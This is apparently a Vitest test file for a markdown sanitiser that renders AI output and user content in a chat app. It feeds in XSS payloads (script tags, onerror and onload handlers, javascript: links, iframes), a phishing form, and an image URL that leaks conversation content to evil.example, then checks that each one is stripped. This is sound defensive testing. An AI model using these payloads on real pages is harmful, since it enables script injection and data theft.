import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

function html(text: string, citations = false): HTMLElement {
  const host = document.createElement('div')
  host.innerHTML = renderMarkdown(text, citations)
  return host
}

describe('renderMarkdown：AI 输出和用户内容的唯一防线', () => {
  const attacks: Array<[string, string]> = [
    ['<script> 标签', 'hi <script>window.__x=1</script>'],
    ['<img onerror>', '<img src=x onerror="window.__x=1">'],
    ['<svg onload>', '<svg onload="window.__x=1"></svg>'],
    ['javascript: 链接', '[点我](javascript:window.__x=1)'],
    ['data:text/html 链接', '[点我](data:text/html;base64,PHNjcmlwdD4=)'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['内联事件处理器', '<a href="#" onclick="window.__x=1">x</a>'],
    ['object / embed', '<object data="x"></object><embed src="x">'],
  ]
  for (const [name, payload] of attacks) {
    it(`去掉可执行内容：${name}`, () => {
      const root = html(payload)
      expect(root.querySelector('script, iframe, object, embed')).toBeNull()
      for (const el of Array.from(root.querySelectorAll('*'))) {
        for (const attr of Array.from(el.attributes)) {
          expect(attr.name.startsWith('on')).toBe(false)
          if (attr.name === 'href' || attr.name === 'src') {
            expect(attr.value.toLowerCase().startsWith('javascript:')).toBe(false)
          }
        }
      }
      expect((window as any).__x).toBeUndefined()
    })
  }

  it('去掉钓鱼表单和表单控件', () => {
    const root = html('<form action="https://evil.example"><input name="password"><button>登录</button></form>')
    expect(root.querySelector('form, input, button, select, textarea')).toBeNull()
  })

  it('去掉 style / id / name，class 只保留渲染需要的', () => {
    const root = html('<div class="fixed inset-0 z-50 cite-ref" style="position:fixed" id="login" name="x">假登录框</div>')
    const div = root.querySelector('div')!
    expect(div.getAttribute('style')).toBeNull()
    expect(div.getAttribute('id')).toBeNull()
    expect(div.getAttribute('name')).toBeNull()
    expect(div.getAttribute('class')).toBe('cite-ref')
  })

  it('外部图片不会自动加载，改成需要用户点击的链接', () => {
    const root = html('![x](https://evil.example/leak?d=对话内容)')
    expect(root.querySelector('img')).toBeNull()
    const link = root.querySelector('a')!
    expect(link.getAttribute('rel')).toContain('noopener')
    expect(link.textContent).toContain('evil.example')
  })

  it('data: 图片可以显示', () => {
    const root = html('![x](data:image/png;base64,iVBORw0KGgo=)')
    expect(root.querySelector('img')).not.toBeNull()
  })

  it('新窗口打开的链接：要么没有 target，要么带 noopener（不能让新页面拿到 window.opener）', () => {
    const link = html('<a href="https://example.com" target="_blank">x</a>').querySelector('a')!
    if (link.getAttribute('target') === '_blank') {
      expect(link.getAttribute('rel')).toBe('noopener noreferrer nofollow')
    } else {
      expect(link.hasAttribute('target')).toBe(false)
    }
  })

  it('正常的 Markdown 照常渲染', () => {
    const source = '# 标题\n\n**加粗** 和 `代码`\n\n- 一\n- 二\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```'
    const root = html(source)
    expect(root.querySelector('h1')?.textContent).toBe('标题')
    expect(root.querySelector('strong')?.textContent).toBe('加粗')
    expect(root.querySelectorAll('li')).toHaveLength(2)
    expect(root.querySelector('table')).not.toBeNull()
    expect(root.querySelector('code.language-python')).not.toBeNull()
  })

  it('引用来源标记变成可识别的 cite-ref', () => {
    const root = html('结论【来源1】', true)
    expect(root.querySelector('.cite-ref')?.getAttribute('data-cite')).toBe('1')
  })

  it('脚本生成的附件链接改成页内锚点（点击时由页面带登录态下载）', () => {
    const id = 'a'.repeat(24)
    expect(html(`[报告](attachment://${id})`).querySelector('a')?.getAttribute('href')).toBe(`#attachment-${id}`)
  })

  it('空内容不报错', () => {
    expect(renderMarkdown('')).toBe('')
    expect(renderMarkdown(undefined as unknown as string)).toBe('')
  })
})
